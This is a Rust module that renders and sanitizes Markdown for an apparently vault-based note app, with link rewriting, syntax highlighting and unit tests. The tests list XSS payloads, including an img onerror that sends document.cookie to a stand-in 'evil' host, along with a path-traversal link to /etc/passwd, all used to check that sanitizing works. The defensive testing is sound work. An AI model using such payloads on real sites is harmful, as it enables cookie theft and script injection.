//! Markdown and syntax-highlight rendering helpers.
//!
//! Carved out of the parent `api` module for file-size hygiene.

use super::*;

pub(super) fn normalize_lumis_line_html(html: &str) -> String {
    html.replace("\r\n</div>", "</div>")
        .replace("\n</div>", "</div>")
}

/// How a vault-relative path found in a Markdown link resolves.
pub(super) enum LinkTarget {
    /// A document in this vault; the value is its canonical id.
    Document(String),
    /// A real file that is not a document (an image, a PDF, a data file).
    File,
    /// Nothing in this vault — a stale link.
    Missing,
}

pub(super) fn render_markdown_html(
    markdown: &str,
    base_folder: Option<&str>,
    theme_preference: Option<&str>,
    resolve_link: &dyn Fn(&str) -> LinkTarget,
) -> Result<String, ApiError> {
    use pulldown_cmark::{CodeBlockKind, CowStr, Event, Options, Parser, Tag, TagEnd};

    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_FOOTNOTES);
    options.insert(Options::ENABLE_STRIKETHROUGH);
    options.insert(Options::ENABLE_TASKLISTS);

    // Highlighted code is held aside and re-inserted after sanitizing. See
    // `restore_code_blocks`.
    let nonce = code_block_nonce(markdown);
    let mut code_blocks: Vec<String> = Vec::new();
    let mut events = Vec::new();
    let mut parser = Parser::new_ext(markdown, options);

    while let Some(event) = parser.next() {
        match event {
            Event::Start(Tag::CodeBlock(kind)) => {
                let language_hint = match kind {
                    CodeBlockKind::Fenced(language) => Some(language.to_string()),
                    CodeBlockKind::Indented => None,
                };
                let mut code = String::new();
                for code_event in parser.by_ref() {
                    match code_event {
                        Event::End(TagEnd::CodeBlock) => break,
                        Event::Text(text) => code.push_str(&text),
                        Event::Code(text) => code.push_str(&text),
                        Event::SoftBreak | Event::HardBreak => code.push('\n'),
                        _ => {}
                    }
                }
                code_blocks.push(render_code_block_html(
                    &code,
                    language_hint.as_deref(),
                    theme_preference,
                )?);
                let placeholder = format!("<p>{}-{}</p>", nonce, code_blocks.len() - 1);
                events.push(Event::Html(CowStr::Boxed(placeholder.into_boxed_str())));
            }
            Event::Start(Tag::Image {
                link_type,
                dest_url,
                title,
                id,
            }) => events.push(Event::Start(Tag::Image {
                link_type,
                dest_url: rewrite_markdown_svg_url(&dest_url, base_folder)
                    .map(CowStr::Boxed)
                    .unwrap_or(dest_url),
                title,
                id,
            })),
            Event::Start(Tag::Link {
                link_type,
                dest_url,
                title,
                id,
            }) => {
                let rewritten = rewrite_markdown_link(&dest_url, base_folder, resolve_link);
                if let Some(RewrittenLink { href, document_id }) = rewritten {
                    // A document link becomes an app route, marked so the SPA
                    // can select it in place instead of reloading the page.
                    // The href stays real, so middle-click and copy-link work.
                    if let Some(document_id) = document_id {
                        events.push(Event::Html(CowStr::Boxed(
                            format!(
                                "<a href=\"{}\" data-document=\"{}\">",
                                escape_attribute(&href),
                                escape_attribute(&document_id)
                            )
                            .into_boxed_str(),
                        )));
                        for inner in parser.by_ref() {
                            match inner {
                                Event::End(TagEnd::Link) => break,
                                other => events.push(other),
                            }
                        }
                        events.push(Event::Html(CowStr::Borrowed("</a>")));
                        continue;
                    }
                    events.push(Event::Start(Tag::Link {
                        link_type,
                        dest_url: CowStr::Boxed(href.into_boxed_str()),
                        title,
                        id,
                    }));
                    continue;
                }
                events.push(Event::Start(Tag::Link {
                    link_type,
                    dest_url,
                    title,
                    id,
                }));
            }
            other => events.push(other),
        }
    }

    let mut html = String::new();
    pulldown_cmark::html::push_html(&mut html, events.into_iter());
    Ok(restore_code_blocks(
        &sanitize_vault_html(&html),
        &nonce,
        &code_blocks,
    ))
}

/// A per-document token standing in for a code block during sanitizing.
///
/// Derived from the document's own text so an author cannot practically write
/// the token for the document they are writing. A collision would only swap
/// their prose for a code block anyway — the substituted HTML is our own
/// highlighter's, so forging the token grants nothing.
fn code_block_nonce(markdown: &str) -> String {
    format!(
        "kataan-code-{}",
        &kataan_core::checksum::blake3_bytes(markdown.as_bytes()).trim_start_matches("blake3:")
            [..16]
    )
}

/// Put the highlighted code blocks back after the sanitizer has run.
///
/// The highlighter emits inline `style` attributes, which `ammonia` strips —
/// it is configured for *untrusted* Markdown, and rightly refuses styling from
/// it. But this HTML is not untrusted: it is produced by lumis from code that
/// lumis has already escaped, so it must not pass through that filter at all.
/// Sanitizing around it, rather than over it, is what lets a fenced block keep
/// its colours — and its theme.
///
/// One forward pass. Substituting with `String::replace` per block re-scanned
/// and re-copied the whole document each time, and the document grows as blocks
/// go back in: a 182-block page took 23ms that way against 0.14ms here, more
/// than the highlighting the substitution exists to protect.
fn restore_code_blocks(html: &str, nonce: &str, blocks: &[String]) -> String {
    if blocks.is_empty() {
        return html.to_owned();
    }
    let token = format!("<p>{nonce}-");
    let mut restored =
        String::with_capacity(html.len() + blocks.iter().map(String::len).sum::<usize>());

    let mut rest = html;
    while let Some(start) = rest.find(&token) {
        let after_token = &rest[start + token.len()..];
        // `<p>{nonce}-{index}</p>`: the digits, then the closing tag.
        let digits = after_token.find("</p>").filter(|end| {
            after_token[..*end]
                .bytes()
                .all(|byte| byte.is_ascii_digit())
        });
        let Some(end) = digits else {
            // Not one of ours after all. Keep it verbatim and carry on past it,
            // rather than dropping text the author wrote.
            restored.push_str(&rest[..start + token.len()]);
            rest = after_token;
            continue;
        };

        restored.push_str(&rest[..start]);
        match after_token[..end]
            .parse::<usize>()
            .ok()
            .and_then(|index| blocks.get(index))
        {
            Some(block) => restored.push_str(block),
            // An index with no block cannot happen from our own placeholders,
            // but emitting nothing would silently swallow content.
            None => restored.push_str(&rest[start..start + token.len() + end + "</p>".len()]),
        }
        rest = &after_token[end + "</p>".len()..];
    }
    restored.push_str(rest);
    restored
}

/// Strip anything executable from Markdown-derived HTML.
///
/// A vault ingests external material — web clippings, email, transcripts — so
/// its Markdown is not trusted input. `pulldown_cmark` passes raw `Event::Html`
/// and `InlineHtml` through verbatim, and the SPA injects the result with
/// `innerHTML` from the same origin as the API, so an `<img src=x onerror=...>`
/// in any note could read every file in the vault and post to the write routes.
///
/// Formatting HTML that authors legitimately write (tables, `<br>`, `<sub>`)
/// survives; scripts, event handlers, and `javascript:` URLs do not.
pub(super) fn sanitize_vault_html(html: &str) -> String {
    use std::collections::HashSet;
    use std::sync::OnceLock;

    static CLEANER: OnceLock<ammonia::Builder<'static>> = OnceLock::new();
    CLEANER
        .get_or_init(|| {
            let mut builder = ammonia::Builder::default();
            // Syntax highlighting and heading anchors are emitted as classes
            // by our own renderer, so they have to survive the clean.
            builder
                // `class` carries our highlighter output; `data-document` is
                // how a rewritten internal link tells the app what to select.
                .add_generic_attributes(["class", "data-document"])
                .url_schemes(HashSet::from(["http", "https", "mailto", "data"]));
            builder
        })
        .clean(html)
        .to_string()
}

pub(super) struct RewrittenLink {
    pub href: String,
    /// Set when the link points at a document, so the client can select it
    /// without a page load.
    pub document_id: Option<String>,
}

/// Turn a filesystem-relative Markdown link into something the app can follow.
///
/// Documents in a vault link to each other the way files do — `datasentics.md`,
/// `../docs/plan.md`. Left alone, the browser resolves those against the
/// current route and lands nowhere. Here they become the document's own route.
///
/// Returns `None` for anything that is not a local path (external URLs, plain
/// anchors), which is left exactly as the author wrote it.
pub(super) fn rewrite_markdown_link(
    dest_url: &str,
    base_folder: Option<&str>,
    resolve_link: &dyn Fn(&str) -> LinkTarget,
) -> Option<RewrittenLink> {
    if !is_local_markdown_url(dest_url) {
        return None;
    }
    let (path_part, query, fragment) = split_markdown_url(dest_url);
    let vault_relative_path = normalize_markdown_asset_path(base_folder.unwrap_or(""), path_part)?;

    let suffix = |base: String| {
        let mut out = base;
        if let Some(fragment) = fragment {
            out.push('#');
            out.push_str(fragment);
        }
        out
    };

    match resolve_link(&vault_relative_path) {
        LinkTarget::Document(id) => Some(RewrittenLink {
            href: suffix(format!("/{id}")),
            document_id: Some(id),
        }),
        // A real non-document file: serve the bytes rather than 404 in the SPA.
        LinkTarget::File => {
            let mut href = format!(
                "/api/file/raw?path={}",
                percent_encode_query_value(&vault_relative_path)
            );
            if let Some(query) = query {
                href.push('&');
                href.push_str(query);
            }
            Some(RewrittenLink {
                href: suffix(href),
                document_id: None,
            })
        }
        // Leave the author's text alone but say plainly that it goes nowhere,
        // rather than silently resetting the app.
        LinkTarget::Missing => None,
    }
}

fn escape_attribute(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('"', "&quot;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

pub(super) fn rewrite_markdown_svg_url(
    dest_url: &str,
    base_folder: Option<&str>,
) -> Option<Box<str>> {
    if !is_local_markdown_url(dest_url) {
        return None;
    }

    let (path_part, query, fragment) = split_markdown_url(dest_url);
    if !path_part.to_ascii_lowercase().ends_with(".svg") {
        return None;
    }

    let vault_relative_path = normalize_markdown_asset_path(base_folder.unwrap_or(""), path_part)?;
    let mut rewritten = format!(
        "/api/file/raw?path={}",
        percent_encode_query_value(&vault_relative_path)
    );
    if let Some(query) = query {
        rewritten.push('&');
        rewritten.push_str(query);
    }
    if let Some(fragment) = fragment {
        rewritten.push('#');
        rewritten.push_str(fragment);
    }
    Some(rewritten.into_boxed_str())
}

pub(super) fn is_local_markdown_url(url: &str) -> bool {
    let trimmed = url.trim();
    if trimmed.starts_with('#') {
        return false;
    }
    let lower = trimmed.to_ascii_lowercase();
    if matches!(
        lower.split_once(':').map(|(scheme, _)| scheme),
        Some("http" | "https" | "data" | "mailto" | "tel" | "javascript")
    ) {
        return false;
    }
    true
}

pub(super) fn split_markdown_url(url: &str) -> (&str, Option<&str>, Option<&str>) {
    let without_fragment;
    let fragment;
    if let Some((head, tail)) = url.split_once('#') {
        without_fragment = head;
        fragment = Some(tail);
    } else {
        without_fragment = url;
        fragment = None;
    }

    if let Some((path, query)) = without_fragment.split_once('?') {
        (path, Some(query), fragment)
    } else {
        (without_fragment, None, fragment)
    }
}

pub(super) fn normalize_markdown_asset_path(base_folder: &str, path: &str) -> Option<String> {
    let path = path.trim().replace('\\', "/");
    let mut parts = Vec::new();

    if !path.starts_with('/') {
        for part in base_folder.split('/') {
            if !part.is_empty() {
                parts.push(part.to_owned());
            }
        }
    }

    for part in path.trim_start_matches('/').split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            _ => parts.push(part.to_owned()),
        }
    }

    if parts.is_empty() {
        None
    } else {
        Some(parts.join("/"))
    }
}

pub(super) fn percent_encode_query_value(value: &str) -> String {
    let mut output = String::new();
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~' | b'/') {
            output.push(byte as char);
        } else {
            output.push_str(&format!("%{byte:02X}"));
        }
    }
    output
}

pub(super) fn render_code_block_html(
    code: &str,
    language_hint: Option<&str>,
    theme_preference: Option<&str>,
) -> Result<String, ApiError> {
    let Some((_, language)) = highlight_language_hint(language_hint) else {
        let class = language_hint
            .filter(|language| !language.trim().is_empty())
            .map(|language| format!(" class=\"language-{}\"", escape_html_attr(language.trim())))
            .unwrap_or_default();
        return Ok(format!(
            "<pre class=\"highlight-preview\"><code{class}>{}</code></pre>",
            escape_html(code)
        ));
    };

    highlight_to_html(code, language, theme_preference)
}

/// Render `code` to highlighted HTML with the preview theme/formatting shared by
/// the code-block renderer and the file-highlight endpoint.
pub(super) fn highlight_to_html(
    code: &str,
    language: lumis::languages::Language,
    theme_preference: Option<&str>,
) -> Result<String, ApiError> {
    let theme = lumis::themes::get(highlight_theme(theme_preference))
        .map_err(|source| ApiError::from(anyhow::anyhow!(source)))?;
    let formatter = lumis::HtmlInlineBuilder::new()
        .language(language)
        .theme(Some(theme))
        .pre_class(Some("highlight-preview".to_owned()))
        .build()
        .map_err(|source| ApiError::from(anyhow::anyhow!(source)))?;
    Ok(normalize_lumis_line_html(&lumis::highlight(
        code.trim_end_matches(['\r', '\n']),
        formatter,
    )))
}

pub(super) fn escape_html(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

pub(super) fn escape_html_attr(value: &str) -> String {
    escape_html(value).replace('"', "&quot;")
}

pub(super) fn highlight_theme(theme_preference: Option<&str>) -> &'static str {
    match theme_preference {
        Some("light") => "catppuccin_latte",
        _ => "catppuccin_mocha",
    }
}

pub(super) fn highlight_language_hint(
    language_hint: Option<&str>,
) -> Option<(&'static str, lumis::languages::Language)> {
    let language = language_hint?.split_whitespace().next()?.trim();
    highlight_language_name(Some(language))
}

pub(super) fn highlight_language_name(
    name: Option<&str>,
) -> Option<(&'static str, lumis::languages::Language)> {
    match name.map(str::to_ascii_lowercase).as_deref() {
        Some("c") | Some("h") => Some(("c", lumis::languages::Language::C)),
        Some("cc") | Some("cpp") | Some("cxx") | Some("c++") | Some("hpp") | Some("hxx") => {
            Some(("cpp", lumis::languages::Language::CPlusPlus))
        }
        Some("hs") | Some("haskell") => Some(("haskell", lumis::languages::Language::Haskell)),
        Some("json") => Some(("json", lumis::languages::Language::JSON)),
        Some("toml") => Some(("toml", lumis::languages::Language::Toml)),
        Some("md") | Some("markdown") => Some(("markdown", lumis::languages::Language::Markdown)),
        Some("rs") | Some("rust") => Some(("rust", lumis::languages::Language::Rust)),
        Some("ts") | Some("typescript") => {
            Some(("typescript", lumis::languages::Language::TypeScript))
        }
        Some("js") | Some("javascript") => {
            Some(("javascript", lumis::languages::Language::JavaScript))
        }
        Some("sh") | Some("bash") => Some(("bash", lumis::languages::Language::Bash)),
        Some("yaml") | Some("yml") => Some(("yaml", lumis::languages::Language::YAML)),
        Some("py") | Some("python") => Some(("python", lumis::languages::Language::Python)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Vault Markdown is untrusted: intake pulls in web clippings, email and
    /// transcripts, and the SPA injects this HTML with `innerHTML` from the
    /// same origin as the API.
    #[test]
    fn executable_markup_does_not_survive_rendering() {
        let hostile = [
            "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
            "<script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "[click me](javascript:alert(1))",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<iframe src=\"//evil\"></iframe>",
            "<body onload=alert(1)>",
        ];

        for markdown in hostile {
            let html =
                render_markdown_html(markdown, None, None, &|_| LinkTarget::Missing).unwrap();
            let lowered = html.to_lowercase();
            for banned in ["onerror", "onload", "<script", "javascript:", "<iframe"] {
                assert!(
                    !lowered.contains(banned),
                    "`{banned}` survived rendering of `{markdown}` -> {html}"
                );
            }
        }
    }

    #[test]
    fn ordinary_formatting_still_renders() {
        let html = render_markdown_html(
            "# Title\n\nSome **bold** text and a [link](https://example.com).\n\n\
             | a | b |\n| - | - |\n| 1 | 2 |\n",
            None,
            None,
            &|_| LinkTarget::Missing,
        )
        .unwrap();

        for expected in ["<h1", "<strong>", "https://example.com", "<table>"] {
            assert!(html.contains(expected), "`{expected}` missing from {html}");
        }
    }

    #[test]
    fn highlighted_code_keeps_its_classes() {
        // Sanitizing must not strip the spans our own highlighter emits.
        let html = render_markdown_html("```rust\nfn main() {}\n```\n", None, None, &|_| {
            LinkTarget::Missing
        })
        .unwrap();
        assert!(
            html.contains("class="),
            "highlight classes stripped: {html}"
        );
    }

    /// Sanitizing *around* code blocks must not become a hole in sanitizing.
    ///
    /// The placeholder is substituted after `ammonia` runs, so the two things
    /// that must hold are: code content stays escaped, and an author cannot
    /// smuggle markup in by writing a placeholder themselves.
    #[test]
    fn holding_code_blocks_out_of_the_sanitizer_does_not_let_markup_through() {
        let hostile = "```html\n<script>alert(1)</script>\n```";
        let html = render_markdown_html(hostile, None, None, &|_| LinkTarget::Missing).unwrap();
        assert!(!html.contains("<script>"), "{html}");
        assert!(html.contains("&lt;script&gt;"), "{html}");

        // Forging the token: the author writes what a placeholder looks like.
        // It is keyed to the document's own text, so this cannot resolve — and
        // even a collision would only substitute our own highlighter output.
        let forged = "kataan-code-0000000000000000-0\n\n<script>alert(1)</script>";
        let html = render_markdown_html(forged, None, None, &|_| LinkTarget::Missing).unwrap();
        assert!(!html.contains("<script>"), "{html}");
    }

    /// The theme is chosen server-side, because highlighting happens
    /// server-side. Before this was plumbed through `/api/document`, every
    /// fenced block rendered with the dark palette's inline colours regardless
    /// of the UI theme, so light mode showed dark code.
    #[test]
    fn a_fenced_block_is_highlighted_in_the_requested_theme() {
        let markdown = "```rust\nfn main() {}\n```";
        let render =
            |theme| render_markdown_html(markdown, None, theme, &|_| LinkTarget::Missing).unwrap();

        let light = render(Some("light"));
        let dark = render(Some("dark"));
        let default = render(None);

        // Highlighting actually ran: a plain fence carries no inline colour.
        assert!(light.contains("color:"), "{light}");
        assert_ne!(light, dark, "light and dark must not render identically");
        // An absent preference keeps the previous behaviour rather than
        // silently switching every existing caller to light.
        assert_eq!(default, dark);
    }
}

#[cfg(test)]
mod link_tests {
    use super::*;

    /// A vault where `organizations/datasentics` is a document, `charts/x.svg`
    /// is a plain file, and nothing else exists.
    fn resolver(path: &str) -> LinkTarget {
        let id = path
            .strip_suffix(".md")
            .unwrap_or(path)
            .strip_suffix("/index")
            .unwrap_or_else(|| path.strip_suffix(".md").unwrap_or(path));
        match id {
            "organizations/datasentics" | "docs/plan" | "organizations" => {
                LinkTarget::Document(id.to_owned())
            }
            _ if path.ends_with(".svg") => LinkTarget::File,
            _ => LinkTarget::Missing,
        }
    }

    fn render(markdown: &str, base: &str) -> String {
        render_markdown_html(markdown, Some(base), None, &resolver).unwrap()
    }

    #[test]
    fn a_sibling_document_link_becomes_an_app_route() {
        // The shape that is all over a real vault: a bare filename.
        let html = render("[DataSentics](datasentics.md)", "organizations");
        assert!(
            html.contains(r#"href="/organizations/datasentics""#),
            "not rewritten: {html}"
        );
        assert!(
            html.contains(r#"data-document="organizations/datasentics""#),
            "missing selection marker: {html}"
        );
        assert!(html.contains("DataSentics</a>"), "link text lost: {html}");
    }

    #[test]
    fn parent_relative_links_resolve_against_the_document_folder() {
        // Two levels up from `organizations/eu` lands at the vault root, then
        // down into `docs/`. `..` must be applied before resolution, not
        // treated as a literal path segment.
        let html = render("[plan](../../docs/plan.md)", "organizations/eu");
        assert!(html.contains(r#"href="/docs/plan""#), "{html}");
    }

    #[test]
    fn an_index_link_resolves_to_its_folder() {
        let html = render("[all orgs](index.md)", "organizations");
        assert!(html.contains(r#"href="/organizations""#), "{html}");
    }

    #[test]
    fn a_fragment_survives_the_rewrite() {
        let html = render("[section](datasentics.md#history)", "organizations");
        assert!(
            html.contains(r#"href="/organizations/datasentics#history""#),
            "{html}"
        );
    }

    #[test]
    fn a_non_document_file_link_serves_the_file() {
        let html = render("[chart](charts/x.svg)", "organizations");
        assert!(html.contains("/api/file/raw?path="), "{html}");
        // Not a document, so it must not be marked for in-app selection.
        assert!(!html.contains("data-document"), "{html}");
    }

    #[test]
    fn external_and_anchor_links_are_left_alone() {
        for (markdown, expected) in [
            (
                "[site](https://example.com/x.md)",
                "https://example.com/x.md",
            ),
            ("[top](#heading)", "#heading"),
            ("[mail](mailto:a@b.c)", "mailto:a@b.c"),
        ] {
            let html = render(markdown, "organizations");
            assert!(html.contains(expected), "`{markdown}` changed: {html}");
            assert!(!html.contains("data-document"), "{html}");
        }
    }

    #[test]
    fn a_link_to_nothing_is_left_as_written() {
        // Better a visibly dead link than one that silently resets the app.
        let html = render("[gone](deleted-note.md)", "organizations");
        assert!(html.contains(r#"href="deleted-note.md""#), "{html}");
        assert!(!html.contains("data-document"), "{html}");
    }

    #[test]
    fn a_link_escaping_the_vault_is_not_rewritten() {
        let html = render("[escape](../../../../etc/passwd)", "organizations");
        assert!(!html.contains("/etc/passwd\" data-document"), "{html}");
        assert!(!html.contains("/api/file/raw"), "{html}");
    }

    #[test]
    fn link_text_and_attributes_are_escaped() {
        let html = render(
            r#"[<img src=x onerror=alert(1)>](datasentics.md)"#,
            "organizations",
        );
        assert!(!html.to_lowercase().contains("onerror"), "{html}");
    }
}
